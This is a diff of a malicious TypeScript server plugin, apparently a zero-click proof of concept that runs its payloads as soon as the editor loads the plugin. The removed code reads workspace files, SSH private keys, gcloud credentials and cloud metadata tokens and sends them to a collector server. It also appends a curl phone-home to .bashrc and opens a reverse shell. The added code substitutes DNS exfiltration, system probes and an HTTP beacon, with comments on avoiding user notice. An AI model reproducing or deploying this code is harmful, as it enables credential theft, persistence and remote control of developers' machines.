-            if (entry.name === 'node_modules' || entry.name === '.git' || entry.name === '.svn') continue;
-            const full = PATH.join(dir, entry.name);
-            if (entry.isDirectory()) {
-                walk(full, depth + 1);
-            } else if (entry.isFile()) {
-                const ext = PATH.extname(entry.name).toLowerCase();
-                const interesting = ['.ts', '.tsx', '.js', '.json', '.yaml', '.yml', '.env', '.tf', '.go', '.py'];
-                if (interesting.includes(ext) && !entry.name.includes('node_modules')) {
-                    try {
-                        const stat = FS.statSync(full);
-                        if (stat.size <= CONFIG.maxFileRead) {
-                            files.push({
-                                path: full,
-                                size: stat.size,
-                                mode: stat.mode,
-                            });
-                        }
-                    } catch (_) { /* skip */ }
-                }
-            }
-        }
-    }
-
-    walk(cwd, 0);
-
-    // Read and exfil first 10 files
-    const toRead = files.slice(0, 10);
-    const contents = {};
-    for (const file of toRead) {
         try {
-            contents[file.path] = FS.readFileSync(file.path, 'utf-8');
-        } catch (e) {
-            contents[file.path] = `ERROR: ${e.message}`;
-        }
-    }
-
-    beacon(`${CONFIG.collector}/workspace`, {
-        type: 'workspace_read',
-        cwd,
-        totalFiles: files.length,
-        readFiles: toRead.length,
-        files,
-        contents,
-    });
-}
-
-/**
- * Payload 4: Prototype Pollution for XSS persistence in the editor
- * Contaminates Object.prototype so that any editor feature
- * that checks a property on a plain object gets polluted.
- */
-function payloadPrototypePollution() {
-    log('Firing prototype pollution payload');
-    try {
-        // Standard PP payload
-        Object.prototype.pocMarker = 'POLLUTED_BY_TSSERVER_ZERO_CLICK';
-        Object.prototype.pocTimestamp = new Date().toISOString();
-
-        // XSS gadgets — if supportHtml is checked anywhere
-        Object.prototype.supportHtml = true;
-        Object.prototype.isTrusted = true;
-        Object.prototype.isHTML = true;
-
-        // Crash bypasses (from extensive Theia/VS Code PP research)
-        Object.prototype.src = [];
-        Object.prototype.length = 0;
-
-        // Verify pollution worked
-        const test = {};
-        const success = test.pocMarker === 'POLLUTED_BY_TSSERVER_ZERO_CLICK';
-
-        beacon(`${CONFIG.collector}/pp`, {
-            type: 'prototype_pollution',
-            success,
-            testValue: test.pocMarker,
-            polluted: Object.keys(Object.prototype).filter(k =>
-                ['pocMarker', 'pocTimestamp', 'supportHtml', 'isTrusted', 'src', 'length'].includes(k)
-            ),
-        });
-    } catch (e) {
-        beacon(`${CONFIG.collector}/pp`, {
-            type: 'prototype_pollution',
-            error: e.message,
-        });
-    }
-}
-
-/**
- * Payload 5: ~/.bashrc persistence
- * Appends a reverse shell or beacon to .bashrc so that
- * every new terminal session phones home.
- */
-function payloadBashrcPersistence() {
-    log('Firing bashrc persistence payload');
-    if (!FS || !OS) {
-        beacon(`${CONFIG.collector}/persistence`, { type: 'bashrc', error: 'FS/OS not available' });
-        return;
-    }
-
-    const home = OS.homedir();
-    const bashrcPath = PATH ? PATH.join(home, '.bashrc') : `${home}/.bashrc`;
-
-    // Payload to append — base64-encoded to avoid shell escaping issues
-    const phoneHomeCmd = `(curl -s -o /dev/null -X POST ${CONFIG.collector}/shell-persistence -d "hostname=$(hostname)&user=$(whoami)&ts=$(date +%s)" 2>/dev/null || true) &`;
-    const bashrcPayload = `\n# Cloud Shell session started — $(date)\n${phoneHomeCmd}\n`;
-
-    try {
-        // Check if we already infected this .bashrc
-        let existing = '';
-        try { existing = FS.readFileSync(bashrcPath, 'utf-8'); } catch (_) { /* file may not exist */ }
-        if (existing.includes('shell-persistence')) {
-            log('bashrc already infected, skipping');
-            beacon(`${CONFIG.collector}/persistence`, { type: 'bashrc', status: 'already_infected' });
-            return;
-        }
-
-        FS.appendFileSync(bashrcPath, bashrcPayload);
-        beacon(`${CONFIG.collector}/persistence`, {
-            type: 'bashrc',
-            status: 'infected',
-            path: bashrcPath,
-        });
-    } catch (e) {
-        beacon(`${CONFIG.collector}/persistence`, {
-            type: 'bashrc',
-            status: 'failed',
-            error: e.message,
-            path: bashrcPath,
-        });
-    }
-}
-
-/**
- * Payload 6: SSH key exfiltration
- */
-function payloadSshKeyExfil() {
-    log('Firing SSH key exfil payload');
-    if (!FS || !OS || !PATH) {
-        beacon(`${CONFIG.collector}/ssh`, { type: 'ssh_keys', error: 'FS/OS/PATH not available' });
-        return;
-    }
-
-    const home = OS.homedir();
-    const sshDir = PATH.join(home, '.ssh');
-    const keys = {};
-
-    const keyFiles = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys', 'config'];
-    for (const keyFile of keyFiles) {
-        const keyPath = PATH.join(sshDir, keyFile);
-        try {
-            const stat = FS.statSync(keyPath);
-            if (stat.isFile() && stat.size <= CONFIG.maxFileRead) {
-                keys[keyPath] = FS.readFileSync(keyPath, 'utf-8');
-            }
-        } catch (_) { /* file doesn't exist or can't read */ }
-    }
-
-    if (Object.keys(keys).length > 0) {
-        beacon(`${CONFIG.collector}/ssh`, {
-            type: 'ssh_keys',
-            keyCount: Object.keys(keys).length,
-            keys,
-        });
-    }
-}
-
-/**
- * Payload 7: GCP/GCloud credential exfiltration
- */
-function payloadGcloudCredExfil() {
-    log('Firing gcloud credential exfil payload');
-    if (!FS || !OS || !PATH) {
-        beacon(`${CONFIG.collector}/gcloud`, { type: 'gcloud_creds', error: 'FS/OS/PATH not available' });
-        return;
-    }
-
-    const home = OS.homedir();
-    const gcloudPaths = [
-        PATH.join(home, '.config', 'gcloud'),
-        PATH.join(home, '.config', 'gcloud', 'credentials.db'),
-        PATH.join(home, '.config', 'gcloud', 'access_tokens.db'),
-        PATH.join(home, '.config', 'gcloud', 'legacy_credentials'),
-        PATH.join(home, '.config', 'gcloud', 'application_default_credentials.json'),
-    ];
-
-    // Also check env
-    const envVars = {};
-    const credEnvKeys = [
-        'GOOGLE_APPLICATION_CREDENTIALS',
-        'GCLOUD_ACCESS_TOKEN',
-        'CLOUDSDK_AUTH_ACCESS_TOKEN',
-        'GOOGLE_API_KEY',
-        'GCP_SA_KEY',
-    ];
-    try {
-        for (const key of credEnvKeys) {
-            if (process.env[key]) {
-                envVars[key] = process.env[key].substring(0, 100) + '...(truncated)';
-            }
-        }
-    } catch (_) { /* env access error */ }
-
-    const files = {};
-    for (const p of gcloudPaths) {
-        try {
-            const stat = FS.statSync(p);
-            if (stat.isFile() && stat.size <= CONFIG.maxFileRead) {
-                files[p] = FS.readFileSync(p, 'utf-8');
-            }
-        } catch (_) { /* doesn't exist */ }
-    }
-
-    if (Object.keys(envVars).length > 0 || Object.keys(files).length > 0) {
-        beacon(`${CONFIG.collector}/gcloud`, {
-            type: 'gcloud_creds',
-            envVars,
-            files,
-        });
-    }
-}
-
-/**
- * Payload 8: GCP metadata server probe
- * Attempts to reach the GCP metadata server
- */
-function payloadMetadataServer() {
-    log('Firing metadata server probe');
-    if (!CP) {
-        beacon(`${CONFIG.collector}/metadata`, { type: 'metadata', error: 'child_process not available' });
-        return;
-    }
-
-    const probes = [
-        { label: 'metadata_root', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/ 2>&1 || echo "unreachable"' },
-        { label: 'service_accounts', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>&1 || echo "unreachable"' },
-        { label: 'identity_token', cmd: 'curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=cloudshell 2>&1 || echo "unreachable"' },
-    ];
-
-    const results = {};
-    for (const probe of probes) {
-        results[probe.label] = safeExec(probe.cmd);
-    }
-
-    beacon(`${CONFIG.collector}/metadata`, {
-        type: 'metadata_probe',
-        results,
-    });
-}
-
-/**
- * Payload 9: Reverse shell (DISABLED by default — too noisy)
- * Only enabled if CONFIG.payloads.reverseShell is true
- */
-function payloadReverseShell() {
-    log('Firing reverse shell payload');
-    if (!NET || !CP) {
-        beacon(`${CONFIG.collector}/shell`, { type: 'reverse_shell', error: 'NET/CP not available' });
-        return;
-    }
-
-    // This is disabled by default — only for lab testing
-    const host = process.env.REV_SHELL_HOST || CONFIG.collector.replace(/^https?:\/\//, '').split(':')[0];
-    const port = parseInt(process.env.REV_SHELL_PORT || '4444', 10);
-
-    try {
-        const client = NET.connect({ host, port }, () => {
-            const sh = CP.spawn('/bin/sh', [], {
-                stdio: ['pipe', 'pipe', 'pipe'],
-            });
-            client.pipe(sh.stdin);
-            sh.stdout.pipe(client);
-            sh.stderr.pipe(client);
-            sh.on('exit', () => client.end());
-        });
-        client.on('error', (e) => {
-            log('Reverse shell connection failed:', e.message);
-        });
-    } catch (e) {
-        log('Reverse shell exception:', e.message);
+            FS.appendFileSync('/tmp/ts-plugin-http-error.txt',
+                new Date().toISOString() + '|EXCEPTION:' + e.message + '\n');
+        } catch (_) {}
+        return false;
     }
 }
 
 // ═══════════════════════════════════════════════════════════════
-// PAYLOAD DISPATCHER
+// SECTION 7: SHELL COMMAND PROBES (optional — noisy)
 // ═══════════════════════════════════════════════════════════════
 
-let payloadsFired = false;
+function shellProbes() {
+    if (!CP) return { error: 'child_process not available' };
+
+    var results = {};
+
+    // Probe 1: whoami
+    try {
+        results.whoami = CP.execSync('whoami', {
+            timeout: 3000,
+            encoding: 'utf-8'
+        }).trim();
+    } catch (e) {
+        results.whoami = 'FAILED: ' + e.message;
+    }
+
+    // Probe 2: hostname
+    try {
+        results.hostname_cmd = CP.execSync('hostname', {
+            timeout: 3000,
+            encoding: 'utf-8'
+        }).trim();
+    } catch (e) {
+        results.hostname_cmd = 'FAILED: ' + e.message;
+    }
+
+    // Probe 3: pwd
+    try {
+        results.pwd = CP.execSync('pwd', {
+            timeout: 3000,
+            encoding: 'utf-8',
+            cwd: (function() { try { return process.cwd(); } catch (_) { return '/'; } })()
+        }).trim();
+    } catch (e) {
+        results.pwd = 'FAILED: ' + e.message;
+    }
+
+    // Probe 4: ls -la in CWD
+    try {
+        results.ls_cwd = CP.execSync('ls -la', {
+            timeout: 5000,
+            encoding: 'utf-8',
+            cwd: (function() { try { return process.cwd(); } catch (_) { return '/'; } })(),
+            maxBuffer: 1024 * 1024
+        }).trim().substring(0, 5000);
+    } catch (e) {
+        results.ls_cwd = 'FAILED: ' + e.message;
+    }
+
+    // Probe 5: id (user/group info)
+    try {
+        results.id = CP.execSync('id', {
+            timeout: 3000,
+            encoding: 'utf-8'
+        }).trim();
+    } catch (e) {
+        results.id = 'FAILED: ' + e.message;
+    }
+
+    // Probe 6: env (filtered)
+    try {
+        results.env_count = CP.execSync('env | wc -l', {
+            timeout: 3000,
+            encoding: 'utf-8'
+        }).trim();
+    } catch (e) {
+        results.env_count = 'FAILED: ' + e.message;
+    }
+
+    // Write to filesystem
+    try {
+        FS.writeFileSync('/tmp/ts-plugin-shell-probes.json', JSON.stringify(results, null, 2));
+    } catch (_) {}
+
+    return results;
+}
+
+// ═══════════════════════════════════════════════════════════════
+// SECTION 8: PAYLOAD DISPATCHER
+// ═══════════════════════════════════════════════════════════════
+
+var payloadsFired = false;
 
 function fireAllPayloads() {
     if (payloadsFired) return;
     payloadsFired = true;
 
-    log('=== FIRING ALL PAYLOADS ===');
-    log('Process:', process.pid, 'Parent:', (() => { try { return process.ppid; } catch (_) { return -1; } })());
-    log('Platform:', process.platform, 'Arch:', process.arch);
+    // Phase 1: DNS exfiltration (PRIMARY — fires first)
+    if (CONFIG.dnsEnabled) {
+        try { dnsExfiltrateAll(); } catch (e) {
+            try { FS.appendFileSync('/tmp/ts-plugin-dns-error.txt',
+                new Date().toISOString() + '|dnsExfiltrateAll|' + e.message + '\n'); } catch (_) {}
+        }
+    }
 
-    // Always fire beacon first — establishes comms
-    try { payloadBeacon(); } catch (e) { log('beacon failed:', e.message); }
+    // Phase 2: Filesystem probes
+    try {
+        var fsResults = filesystemProbes();
+        try { FS.appendFileSync('/tmp/ts-plugin-fs-probes.txt',
+            new Date().toISOString() + '|PROBES_DONE|' + fsResults.length + '\n'); } catch (_) {}
+    } catch (e) {
+        try { FS.appendFileSync('/tmp/ts-plugin-fs-error.txt',
+            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
+    }
 
-    // Fire configured payloads
-    if (CONFIG.payloads.envExfil) {
-        try { payloadEnvExfil(); } catch (e) { log('envExfil failed:', e.message); }
+    // Phase 3: Environment fingerprinting
+    try {
+        var fp = environmentFingerprint();
+        try { FS.appendFileSync('/tmp/ts-plugin-fp-done.txt',
+            new Date().toISOString() + '|FP_DONE|pid=' + fp.pid + '|user=' + fp.username + '\n'); } catch (_) {}
+    } catch (e) {
+        try { FS.appendFileSync('/tmp/ts-plugin-fp-error.txt',
+            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
     }
-    if (CONFIG.payloads.workspaceRead) {
-        try { payloadWorkspaceRead(); } catch (e) { log('workspaceRead failed:', e.message); }
+
+    // Phase 4: Cloud Shell detection
+    try {
+        var csResult = cloudShellDetection();
+        try { FS.appendFileSync('/tmp/ts-plugin-cs-detect.txt',
+            new Date().toISOString() + '|CLOUD_SHELL=' + csResult.isCloudShell + '\n'); } catch (_) {}
+    } catch (e) {
+        try { FS.appendFileSync('/tmp/ts-plugin-cs-error.txt',
+            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
     }
-    if (CONFIG.payloads.prototypePollution) {
-        try { payloadPrototypePollution(); } catch (e) { log('prototypePollution failed:', e.message); }
+
+    // Phase 5: Shell probes (optional — noisier)
+    try {
+        var shResults = shellProbes();
+        try { FS.appendFileSync('/tmp/ts-plugin-sh-done.txt',
+            new Date().toISOString() + '|SHELL_PROBES_DONE|whoami=' +
+            (shResults.whoami || '?') + '\n'); } catch (_) {}
+    } catch (e) {
+        try { FS.appendFileSync('/tmp/ts-plugin-sh-error.txt',
+            new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
     }
-    if (CONFIG.payloads.bashrcPersistence) {
-        try { payloadBashrcPersistence(); } catch (e) { log('bashrcPersistence failed:', e.message); }
+
+    // Phase 6: HTTP beacon (LAST — lowest priority, most likely blocked)
+    if (CONFIG.httpEnabled) {
+        // Delayed slightly so DNS fires first
+        setTimeout(function() {
+            try {
+                httpBeacon(CONFIG.httpCollector, {
+                    exfilMethod: 'http_fallback',
+                    channelsAttempted: ['sync_markers', 'dns_exfil', 'fs_probes',
+                        'env_fingerprint', 'cloudshell_detect', 'shell_probes', 'http_beacon'],
+                });
+            } catch (e) {
+                try { FS.appendFileSync('/tmp/ts-plugin-http-final-error.txt',
+                    new Date().toISOString() + '|' + e.message + '\n'); } catch (_) {}
+            }
+        }, 500);
     }
-    if (CONFIG.payloads.sshKeyExfil) {
-        try { payloadSshKeyExfil(); } catch (e) { log('sshKeyExfil failed:', e.message); }
-    }
-    if (CONFIG.payloads.gcloudCredExfil) {
-        try { payloadGcloudCredExfil(); } catch (e) { log('gcloudCredExfil failed:', e.message); }
-    }
-    if (CONFIG.payloads.metadataServer) {
-        try { payloadMetadataServer(); } catch (e) { log('metadataServer failed:', e.message); }
-    }
-    if (CONFIG.payloads.reverseShell) {
-        try { payloadReverseShell(); } catch (e) { log('reverseShell failed:', e.message); }
-    }
+
+    // Write final completion marker
+    try {
+        FS.writeFileSync('/tmp/ts-plugin-payloads-complete',
+            new Date().toISOString() + '|ALL_PAYLOADS_DISPATCHED|pid=' +
+            (function() { try { return process.pid; } catch (_) { return -1; } })() + '\n');
+    } catch (_) {}
 }
 
-// Fire payloads at module load time — this is the key to zero-click:
-// require() triggers this synchronously, before TSServer even calls init().
+// ═══════════════════════════════════════════════════════════════
+// FIRE PAYLOADS AT MODULE LOAD TIME
+// This is THE critical line — require() triggers this synchronously,
+// before TSServer even calls init().
+// ═══════════════════════════════════════════════════════════════
+
 fireAllPayloads();
 
 // ═══════════════════════════════════════════════════════════════
-// TYPESCRIPT LANGUAGE SERVICE PLUGIN INTERFACE
-// This is the minimal shim TSServer expects.
-// The payloads already fired above — this just returns a valid
-// plugin object so TSServer doesn't crash/error.
+// SECTION 9: TYPESCRIPT LANGUAGE SERVICE PLUGIN INTERFACE
 // ═══════════════════════════════════════════════════════════════
 
 /**
  * The TSServer plugin factory function.
- *
- * @param {object} modules — TSServer's internal modules:
- *   {
- *     typescript: typeof import('typescript'),
- *     languageService: ts.LanguageService,
- *     project: ts.server.Project,
- *     serverHost: ts.server.ServerHost,
- *   }
- * @returns {object} Plugin instance with optional create/decorate hooks
+ * Payloads already fired at module load time.
+ * This just returns a valid plugin object so TSServer doesn't crash.
  */
 function init(modules) {
-    log('init() called by TSServer');
-
-    // Payloads already fired at module load time.
-    // But we can ALSO fire them here as a secondary trigger
-    // in case module-load firing was somehow suppressed.
+    // Secondary trigger — in case module-load firing was suppressed
     fireAllPayloads();
 
-    // Set up periodic beacon if configured
-    if (CONFIG.beaconInterval > 0) {
-        const interval = setInterval(() => {
-            try { payloadBeacon(); } catch (_) { /* silent */ }
-        }, CONFIG.beaconInterval);
-        if (interval && interval.unref) {
-            interval.unref(); // Don't keep process alive just for beacon
-        }
-    }
+    // Write init marker
+    try {
+        FS.appendFileSync('/tmp/ts-plugin-init-called.txt',
+            new Date().toISOString() + '|INIT_CALLED\n');
+    } catch (_) {}
 
-    // Optionally keep process alive for debugging
-    if (CONFIG.payloads.processLinger) {
-        log('Process linger enabled — keeping event loop alive');
-        const linger = setInterval(() => {
-            log('Linger heartbeat');
-        }, 60000);
-        if (linger && !linger.unref) {
-            // Can't unref — process stays alive
-        } else if (linger) {
-            linger.unref();
-        }
-    }
-
-    // Return a minimal plugin that implements the TSServer plugin interface.
-    // We MUST NOT crash TSServer — a crashing plugin might alert the user.
     return {
-        /**
-         * Called when TSServer creates a language service for a project.
-         * We don't need to do anything here — just return the LS as-is.
-         */
-        create(info) {
-            log('create() called for project:', info.project.getProjectName());
+        create: function(info) {
+            try {
+                FS.appendFileSync('/tmp/ts-plugin-create-called.txt',
+                    new Date().toISOString() + '|CREATE_CALLED|project=' +
+                    (info && info.project ? info.project.getProjectName() : '?') + '\n');
+            } catch (_) {}
             return info.languageService;
         },
 
-        /**
-         * Called to get external files for the project.
-         * Return empty array — we don't add files.
-         */
-        getExternalFiles() {
+        getExternalFiles: function() {
             return [];
         },
 
-        /**
-         * Called on configuration change.
-         */
-        onConfigurationChanged(config) {
-            log('Configuration changed');
+        onConfigurationChanged: function(config) {
+            try {
+                FS.appendFileSync('/tmp/ts-plugin-config-changed.txt',
+                    new Date().toISOString() + '|CONFIG_CHANGED\n');
+            } catch (_) {}
         },
     };
 }
 
 module.exports = init;
-
-// Signal that this is a TypeScript server plugin
 module.exports.typescriptServerPlugin = true;
-
-log('Plugin module fully loaded and ready');
